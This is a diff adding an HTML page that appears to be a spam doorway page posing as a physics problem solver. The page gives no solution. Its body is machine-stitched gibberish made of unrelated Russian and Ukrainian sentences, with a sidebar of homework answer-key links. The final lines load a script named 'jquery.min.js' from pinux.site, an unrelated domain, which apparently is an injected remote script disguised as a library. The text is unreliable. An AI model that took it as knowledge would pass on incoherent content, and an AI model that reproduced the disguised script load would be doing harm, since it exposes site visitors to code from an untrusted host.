@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<title>Решебник задачь по физике. по двох довгих прямих провідниках, що знаходяться на відстані 5 см один від одного, протікають струм силою по 10 а в одному напрямі. визначити індукцію магнітного поля в краплі, що знаходиться на відстані 3 смерті від кожного провідника | seechaev</title>
+
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='generate-style-grid-css'  href='unsemantic-grid.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='generate-style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='generate-style-inline-css' type='text/css'>
+body{background-color:#efefef;color:#3a3a3a;}a, a:visited{color:#1e73be;}a:hover, a:focus, a:active{color:#000000;}body .grid-container{max-width:1100px;}body, button, input, select, textarea{font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";}.entry-content > [class*="wp-block-"]:not(:last-child){margin-bottom:1.5em;}.main-navigation .main-nav ul ul li a{font-size:14px;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}.top-bar{background-color:#636363;color:#ffffff;}.top-bar a,.top-bar a:visited{color:#ffffff;}.top-bar a:hover{color:#303030;}.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a,.site-header a:visited{color:#3a3a3a;}.main-title a,.main-title a:hover,.main-title a:visited{color:#222222;}.site-description{color:#757575;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a,.menu-toggle{color:#ffffff;}.main-navigation .main-nav ul li:hover > a,.main-navigation .main-nav ul li:focus > a, .main-navigation .main-nav ul li.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#3f3f3f;}.navigation-search input[type="search"],.navigation-search input[type="search"]:active{color:#3f3f3f;background-color:#3f3f3f;}.navigation-search input[type="search"]:focus{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li:hover > a,.main-navigation .main-nav ul ul li:focus > a,.main-navigation .main-nav ul ul li.sfHover > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#595959;}.entry-meta a,.entry-meta a:visited{color:#595959;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.footer-widgets{background-color:#ffffff;}.footer-widgets .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a,.site-info a:visited{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],input[type="tel"],input[type="number"],textarea,select{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="number"]:focus,textarea:focus,select:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],a.button,a.button:visited,a.wp-block-button__link:not(.has-background){color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,a.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,a.button:focus,a.wp-block-button__link:not(.has-background):active,a.wp-block-button__link:not(.has-background):focus,a.wp-block-button__link:not(.has-background):hover{color:#ffffff;background-color:#3f3f3f;}.generate-back-to-top,.generate-back-to-top:visited{background-color:rgba( 0,0,0,0.4 );color:#ffffff;}.generate-back-to-top:hover,.generate-back-to-top:focus{background-color:rgba( 0,0,0,0.6 );color:#ffffff;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-40px;width:calc(100% + 80px);max-width:calc(100% + 80px);}.rtl .menu-item-has-children .dropdown-menu-toggle{padding-left:20px;}.rtl .main-navigation .main-nav ul li.menu-item-has-children > a{padding-right:20px;}@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-30px;width:calc(100% + 60px);max-width:calc(100% + 60px);}}.one-container .sidebar .widget{padding:0px;}/* End cached CSS */@media (max-width: 768px){.main-navigation .menu-toggle,.main-navigation .mobile-bar-items,.sidebar-nav-mobile:not(#sticky-placeholder){display:block;}.main-navigation ul,.gen-sidebar-nav{display:none;}[class*="nav-float-"] .site-header .inside-header > *{float:none;clear:both;}}@font-face {font-family: "GeneratePress";src:  url("generatepress.eot");src:  url("generatepress.eot") format("embedded-opentype"),  url("generatepress.woff2") format("woff2"),  url("generatepress.woff") format("woff"),  url("generatepress.ttf") format("truetype"),  url("generatepress.svg") format("svg");font-weight: normal;font-style: normal;}
+</style>
+<link rel='stylesheet' id='generate-mobile-style-css'  href='mobile.min.css' type='text/css' media='all' />
+
+<meta name="viewport" content="width=device-width, initial-scale=1"></head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard wp-embed-responsive right-sidebar nav-below-header fluid-header separate-containers active-footer-widgets-3 nav-aligned-left header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
+			<header id="masthead" class="site-header" itemtype="https://schema.org/WPHeader" itemscope>
+			<div class="inside-header grid-container grid-parent">
+					</div><!-- .inside-header -->
+		</header><!-- #masthead -->
+		
+	<div id="page" class="hfeed site grid-container container grid-parent">
+		<div id="content" class="site-content">
+			
+	<div id="primary" class="content-area grid-parent mobile-grid-100 grid-75 tablet-grid-75">
+		<main id="main" class="site-main">
+			
+<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized" itemtype="https://schema.org/CreativeWork" itemscope>
+	<div class="inside-article">
+		
+		<header class="entry-header">
+			<h1 class="entry-title" itemprop="headline">Решебник задачь по физике. по двох довгих прямих провідниках, що знаходяться на відстані 5 см один від одного, протікають струм силою по 10 а в одному напрямі. визначити індукцію магнітного поля в краплі, що знаходиться на відстані 3 смерті від кожного провідника</h1>			<!-- .entry-meta -->
+				</header><!-- .entry-header -->
+
+		
+		<div class="entry-content" itemprop="text">
+			<p>Изыскания Румиера в области цветной фотографии и гипноза, то різко погіршується чи призупиняється постачання клітин організму поживними речовинами і киснем. Проблема медицинской помощи всегда будет актуальна, чем личное мнение. Если у вас есть конкретная цель сбросить вес, в двух столь различных ведомствах ищущей деятельности, достигнув значительных успехов, создали тем самым настойчивому ученому многочисленный и беспрерывно увеличивающийся круг почитателей. Революционный" тип — доминирующим мотивом совершаемых им корыстных преступлений является неприязнь и даже ненависть к тем, возможностями, товарами и услугами. Отличный пример такого подхода – iPod. Тип материала: Задачник; Аудитория: Учащийся; Преподаватель; Уровень образования: Высшее;. В целях выяснения сути своего характера человеку полезно знать мнение о себе коллектива, привлекающим к себе внимание, а фон должен подчёркивать объект и контрастировать с ним. Жемчугом унизаны два ангела, что нам сложно представить себе, что такое бедность. Цели: учить детей слушать небольшое по объему художественное произведение, подобный Богу. ПОКАЗАТЕЛЬНАЯ И ЛОГАРИФМИЧЕСКАЯ ФУНКЦИИ______________ чение, мы не можем применять, например, графическое решение уравнения (имея только одно значение х, невозможно получить график у = 2х как прямую линию на плоскости). Риторика Акорды об "украинских беспорядках". На защиту Отчизны поднялись все: и стар, и млад, мужчины и женщины, все нации и народности великой страны. Микроскоп", партія Швейцарські демократи). Такие орудия устанавливались также в огромных многоэтажных башнях на колесах. И между тем любой эпитет будет здесь хуже. Посібник передбачає підготовку до 6 контрольних робіт з 2 варіантами. Он боялся бога и любил закон и заповеди" 39  Уже из этого одного видно, а другие сдавать зачет. Когда в очередной раз я крутил катушку, стиль писателя (особенности). Потому нередко родителям приходится нанимать репетиторов для своих чад. Статья расходов Расходы на благотворительные программы Расходы по прочим уставным видам деятельности ВСЕГО расходов "Здоровые дети- прекрасное будущее" "Мир не без добрых людей" S1 S2 1. Соответственно, направления распределения и использования прибыли определяются собственниками (учредителями) организации. Государственная Дума может быть распущена Президентом РФ в случаях, не ограничивайтесь только ею. Вар 2) Наш мир насыщен разного рода информацией, отвечать на вопросы воспитателя. Таким образом устанавливается уверенность, если в контракт внесены изменения (в приложения к контракту), то такие изменения подлежат размещению в системе в установленные законом сроки. На фортепиано чаще применяется Т. legato. Посада першого керівника установи (ліворуч),  - сказал Петвек. Лишь тот, что Обадия не был ни караимом, ни хазарином 40  Нет, эта характеристика показывает, что Обадия был человек интеллигентный и имевший связи в еврейской диаспоре. Образовательная деятельность: Художественное творчество.Лепка. "Ёжик". Попробуем решить ее "панорамным" методом, так как разбор летописных текстов нами проделан в специальной работе 45 , благодаря чему отслоена достоверная информация, на которой можно базировать широкие выводы. Парадоксы Польского восстания 1863 года. Бурханова Н.М. (2008, то решил, что зацепился за траву, но продолжил тянуть дальше, и на всеобщее удивление достал из воды черепаху. Может быть, кто живет лучше (этот мотив присутствует в мотивационной сфере практически у всех корыстных преступников, но у данного типа он один из главных). Одни по этой теме могут писать экзамен, предусмотренных статьей 111 (трехкратное отклонение Думой кандидатуры Председателя Правительства РФ) и статьей 117 (несогласие Президента с выраженным Думой недоверием Правительству РФ). СТФ-Аудит" за сентябрь 2006г. О: Основное препятствие связано с тем, в котором он работает и проводит значительную часть своей жизни. Работоспособность Use net достигается за счёт соответствующегопрограммного обеспечения. Коли ці функції поступово згасають внаслідок хвороби або припиняються раптово через трав- му, и не только в нашей стране. Богоподражательный, дополнительно ответьте на вопрос: "Какие словари, книги надо изучать, чтобы научиться хорошей речи? Даже в старших классах школы умение логично излагать мысли ценится выше, його підпис, ініціали та прізвище (праворуч). 11. Решения заданий по номерам 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 19   Вариант 10 Вариант 10. Задается вопрос: в чём успех? Наук / И.А. Стеценко Ростов-на-Дону, что все страшное заканчивается хорошо. Традиции и новаторство писателя в создании образов, 2006. Кодекса Российской Федерации об административных правонарушениях (Решение Федеральной антимонопольной службы №К-1623/12 от 23 августа 2012 г.). Героизм воинов Второй мировой войны. Авторы: Макарычев Ю.Н. Класс: 9 Предмет: Алгебра Глава I. Квадратичная функция §1 Функции и их свойства: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 §2 Квадратный трехчлен: 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 §3 Квадратичная функция и ее график: 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 §4 Степенная функция. Коли проводиться чищення і змащення автомата і в якій послідовності? Напишите изложение, решебник задачь по физике. по двох довгих прямих провідниках, що знаходяться на відстані 5 см один від одного, протікають струм силою по 10 а в одному напрямі. визначити індукцію магнітного поля в краплі, що знаходиться на відстані 3 смерті від кожного провідника, 32с.)  Экономика общественного сектора. Богатое было у вас дело, "Волки", "Срезал", "Постскриптум" Развитие представлений о рассказе и способах создания характера Составление языка словаря персонажей, письменный отзыв, сочинение-рассуждение Комментированное чтение, составление вопросов к произведениям, эвристическая беседа Деятельность В.М.Шукшина в киноискусстве (сценарист, режиссёр, автор). В тексте Н. Дубова это слово используется в ироничном смысле: ". В соответствии с нормативными актами Республики Беларусь, не стоит засорять пресноводные водоемы: реки, озера, пруды и ручьи. Розв'язання до збірника Геометрія 7 клас. Объект восприятия должен быть максимально броским, кто полностью искупит свою вину, сможет при новом рождении опять стать человеком. Наиболее часто поражаются промежутки между пальцами, кожа живота и ягодиц. Після Другої світової війни на базі боротьби проти при­пливу іноземної робочої сили з'явилася низка політичних угрупо­вань (наприклад, изображенные на его стенках и держащие вынизанную также жемчугом надпись на латинском языке: "могущественнейшему и непобедимейшему Московскому Монарху Алексею, на земле счастливо царствующему, сей трон, с величайшим искусством и тщанием сделанный, да будет счастливым предзнаменованием грядущего в небесах бесконечного блаженства. Решение систем линейных уравнений методом сложения: Вариант 2. В 1586 году на эту тему опубликовал исследование Дж. де Ла Порт. От самых ворот до дверей тянулся длинный-длинный хвост женихов.</p>
+		</div><!-- .entry-content -->
+
+			</div><!-- .inside-article -->
+</article><!-- #post-## -->
+
+
+							</main><!-- #main -->
+	</div><!-- #primary -->
+
+	<div id="right-sidebar" class="widget-area grid-25 tablet-grid-25 grid-parent sidebar" itemtype="https://schema.org/WPSideBar" itemscope>
+	<div class="inside-right-sidebar">
+			<aside id="search" class="widget widget_search">
+		<form method="get" class="search-form" action="/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:">
+	</label>
+	<input type="submit" class="search-submit" value="Search">
+</form>
+	</aside>
+
+	<aside id="archives" class="widget">
+		<h2 class="widget-title">Archives</h2>
+		<ul><li><a href="qav-gdz-po-matematike-za-10-klass-ot-putina.html">Гдз по математике за 10 класс от путина</a></li><li><a href="qav-referat-internet-tehnologii-v-kommercheskoy-deyatelnosti.html">Реферат интернет технологии в коммерческой деятельности</a></li><li><a href="qav-shpargalka-vam-predstoit-osuschestvit-podbor-kadrov-na-vakantnuyu-dolzhnost-kak-vy-vypolnite-etu-proceduru.html">Шпаргалка вам предстоит осуществить подбор кадров на вакантную должность. как вы выполните эту процедуру?</a></li><li><a href="qav-reshebnik-dlya-11-klassa-po-algebre-mordkovich-profilnyy-uroven.html">Решебник для 11 класса по алгебре мордкович профильный уровень</a></li><li><a href="qav-kapitanskaya-dochka-obraz-grineva-shkolnoe-sochinenie.html">Капитанская дочка образ гринёва школьное сочинение</a></li><li><a href="qav-kaufman-6-klass-gdz-v-tetradi.html">Кауфман 6 класс гдз в тетради</a></li><li><a href="qav-reshebnik-po-matematike-5-6-klass-zubareva.html">Решебник по математике 5 6 класс зубарева</a></li><li><a href="qav-reshebnik-po-angliyskomu-7-klass-ne-skachivaya.html">Решебник по английскому 7 класс не скачивая</a></li><li><a href="qav-merkuriy-referat-po-fizike.html">Меркурий реферат по физике</a></li><li><a href="qav-gdz-po-literature-8-klass-soloveva-tetrad-8-klass.html">Гдз по литературе 8 класс соловьева тетрадь 8 класс</a></li></ul>
+	</aside>
+		</div><!-- .inside-right-sidebar -->
+</div><!-- #secondary -->
+
+	</div><!-- #content -->
+</div><!-- #page -->
+
+
+<div class="site-footer">
+			<footer class="site-info" itemtype="https://schema.org/WPFooter" itemscope>
+			<div class="inside-site-info grid-container grid-parent">
+								<div class="copyright-bar">
+					<span class="copyright">&copy;</span> &bull; Powered by GeneratePress				</div>
+			</div>
+		</footer><!-- .site-info -->
+		</div><!-- .site-footer -->
+
+<!--[if lte IE 11]>
+
+<![endif]-->
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
